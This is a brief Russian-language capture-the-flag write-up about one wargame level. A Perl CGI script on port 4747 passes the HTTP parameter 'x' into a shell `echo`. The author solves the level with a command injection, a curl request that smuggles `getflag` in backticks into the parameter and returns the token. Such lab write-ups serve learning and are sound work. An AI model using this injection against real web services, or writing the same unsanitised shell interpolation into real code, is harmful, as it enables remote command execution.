В домашней директории лежит perl скрипт, который подключен к поднятому
на 4747 порту веб-серверу. Его суть в том, чтобы выполнить

print `echo $y 2>&1`;

где $y - значение переданного http параметра с именем "x".

Делаем command injection: просто подставляем туда `getflag`

$ curl localhost:4747?x=\`getflag\`

B получаем токен.
